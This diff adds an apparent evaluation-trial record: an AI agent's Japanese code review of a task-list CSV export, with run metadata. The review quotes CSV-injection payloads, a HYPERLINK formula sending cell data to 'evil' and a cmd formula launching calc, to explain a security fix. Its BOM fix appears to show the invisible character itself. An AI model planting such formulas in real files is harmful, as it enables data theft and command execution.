@@ -1,0 +1,39 @@
+{
+  "trial": "W21-cr-high-c3-2",
+  "scenario": "W21",
+  "config": "cr-high",
+  "case": "c3",
+  "rep": 2,
+  "review_md": "# コードレビュー: タスク一覧の CSV エクスポート\n\n指摘は 7 件です。重要度の高い順に並べています。\n\n## 1. 【高】二重引用符がエスケープされず、CSV が壊れる\n\n- 場所: `src/lib/export.ts:11` の `field()`\n- 問題: 値を二重引用符で囲んでいるが、値の中の `\"` を `\"\"` に置き換えていない（RFC 4180 違反）。タイトルや担当者に `\"` があると CSV が不正になる。\n  - 例: タイトル `「Q3」を \"最終版\" にする` は `\"9\",\"「Q3」を \"最終版\" にする\",...` と出力される。Excel などのパーサーはフィールドを途中で終えてしまい、列がずれたり行が壊れたりする。\n  - doc コメントはカンマと改行の対応をうたっているが、引用符の対応は抜けている。PR の「引用符が含まれていても列がずれない」という説明と食い違う。\n- 直し方: 引用符で囲む前に `value.replace(/\"/g, '\"\"')` を適用する。\n\n## 2. 【高】CSV（数式）インジェクションへの対策がない\n\n- 場所: `src/lib/export.ts:11` の `field()`\n- 問題: ユーザーが入力するタイトルと担当者が、先頭の `=` `+` `-` `@`、タブ、CR を含んだままそのまま出力される。\n  - 例: ログインしているユーザーなら誰でも `POST /api/tasks` で、タイトルが `=HYPERLINK(\"http://evil/?\"&A1,\"click\")` や `=cmd|' /C calc'!A0` のタスクを作れる。別のユーザーがダウンロードした `tasks.csv` を Excel で開くと、この数式が実行される。\n  - 引用符で囲んでも、Excel は数式として評価する。\n- 直し方: 先頭が `= + - @ \\t \\r` のいずれかの値には、先頭に `'`（またはタブ）を付けて無害化する。これを `field()` に入れ、テストを追加する。\n\n## 3. 【中】`status` クエリが検証されていない（CLAUDE.md 規約 2 違反）\n\n- 場所: `src/app/api/tasks/export/route.ts:10`\n- 問題: `as TaskStatus | null` でキャストするだけで、型ガード `isTaskStatus` を通していない。同じディレクトリ階層の `GET /api/tasks` は正しく検証している。\n  - `?status=bogus` の場合、`'bogus'` がそのまま `listTasks` に渡る。SQL の絞り込みが何にも一致せず、見出しだけの CSV がダウンロードされる。規約と PR の説明どおりなら「指定なし」として全件を出力する必要がある。\n  - `?status=`（空文字）は `??` で拾えず、`''` のまま渡って同じく空の結果になる。\n  - キャストのせいで型チェックでは検出されない。\n- 直し方: `isTaskStatus` で検証し、不正な値や空文字は `undefined`（指定なし）として扱う。\n\n## 4. 【中】テストが引用符のバグを検出できず、網羅も足りない\n\n- 場所: `tests/export.test.ts:14`\n- 問題: 「escapes quotes and commas in titles」というテスト名だが、使っているタイトル（`週次 定例の準備`）に引用符もカンマも含まれていない。通常の引用符囲みしか検証しておらず、指摘 1 のバグが素通りする。\n  - `a\"b,c` のようなタイトルなら、現状の `field()` では失敗する。\n  - 改行を含むタイトル、数式で始まる値、ルートの `status` 絞り込みと 401 の応答もテストされていない（CLAUDE.md 規約 5）。\n- 直し方: `\"` とカンマと改行を含むタイトルで、出力と期待値を厳密に比較するテストにする。あわせて次を追加する。\n  - 数式で始まる値のテスト\n  - BOM の有無のテスト\n  - `status` の不正値と空文字のテスト\n  - 未ログイン時に 401 を返すテスト\n\n## 5. 【低】BOM が見えない文字のリテラルで定義されている\n\n- 場所: `src/lib/export.ts:5` の `CSV_BOM`\n- 問題: 文字列リテラルの中に不可視の U+FEFF を直接埋め込んでいる。エディタ、フォーマッタ、コピー＆ペーストで黙って消えることがある。消えると定数が空文字になり、Excel で日本語が文字化けする。差分にも見えず、検知するテストもない。\n- 直し方: `\"﻿\"` と明示的に書く。BOM が先頭にあることを確認するテストを追加する。\n\n## 6. 【低】ルートにロジックが置かれ、一覧 API と処理が重複している\n\n- 場所: `src/app/api/tasks/export/route.ts:11`\n- 問題: `status` の解釈と `listTasks` の呼び出しをルートに直接書いていて、`GET /api/tasks` と処理が重複している。この重複が、このルートで `isTaskStatus` が抜けた原因になっている。\n  - BOM の連結とレスポンスの組み立てが `src/lib/` ではなくルート側にある（CLAUDE.md 規約 1）。\n  - ルートに対するテストがない（規約 5）。\n- 直し方: `parseStatusParam` のようなヘルパーを `src/lib/` に置き、両方のルートで使う。BOM を付けた CSV 本文の生成（例: `toCsvDownload`）も `src/lib/` に移して、単体テストを書く。\n\n## 7. 【低】キャッシュ制御がなく、ファイル名が固定\n\n- 場所: `src/app/api/tasks/export/route.ts:12`\n- 問題:\n  - セッションごとに認証されたユーザーデータの CSV を、`Cache-Control: no-store` なしで返している。共有プロキシやブラウザのキャッシュが、ログアウト後や別のユーザーに同じ内容を返すおそれがある。\n  - `Content-Disposition` のファイル名が常に `tasks.csv` で、絞り込みの内容が反映されない。絞り込み別のエクスポートが上書きされたり、全件の一覧と取り違えられたりする。\n- 直し方: `Cache-Control: no-store`（必要なら `Vary: Cookie` も）を付ける。ファイル名に絞り込み条件（例: `tasks-todo.csv`）や日付を含める。\n",
+  "review_chars": 2918,
+  "review_committed": true,
+  "transcript": {
+    "cost_usd": 0.2355,
+    "tokens": {
+      "input": 18,
+      "output": 5751,
+      "cache_read": 267623,
+      "cache_creation": 44543
+    },
+    "turns": 4,
+    "permission_denials": [
+      {
+        "tool": "Bash",
+        "input": "{\"command\": \"git status --short && git log --oneline | head -5 && git diff @{upstream}...HEAD 2>&1 | head -5; git diff main...HEAD --stat 2>&1 | tail -5; git diff HEAD --stat\"}"
+      }
+    ],
+    "tool_calls": {
+      "Bash": 5,
+      "Write": 1
+    },
+    "skills_used": [],
+    "subagents": 0,
+    "subagent_types": {},
+    "questions": 0,
+    "active_seconds": 50,
+    "answer_key_access": [],
+    "isolation_suspects": [],
+    "final_message": "直前のレビューの 7 件を `REVIEW.md` に書き写し、`REVIEW.md` だけをコミットしました（`bcb644e`）。指摘の追加や削除はしていません。コードは直していません。PR の変更ファイル（`route.ts`・`export.ts`・`export.test.ts`）は、レビュー前からステージ済みで未コミットのままです。\n\n重要度は、レビューの出力に付いていなかったため、私の判断で付けました。\n\n| 重要度 | 指摘 |\n|---|---|\n| 高 | 1. 二重引用符がエスケープされず CSV が壊れる（`field()`） |\n| 高 | 2. 数式インジェクション（先頭が `=` `+` `-` `@` の値）への対策がない（`field()`） |\n| 中 | 3. `status` クエリを `isTaskStatus` で検証していない（規約 2 違反） |\n| 中 | 4. テストが引用符のバグを検出できず、網羅も足りない |\n| 低 | 5. BOM が不可視文字のリテラルで定義されている |\n| 低 | 6. ルートにロジックが置かれ、一覧 API と処理が重複している |\n| 低 | 7. `Cache-Control: no-store` がなく、ファイル名が固定 |\n\n各指摘には、場所、どういう入力で何が起きるか、直し方を書いています。"
+  },
+  "interventions": 0
+}
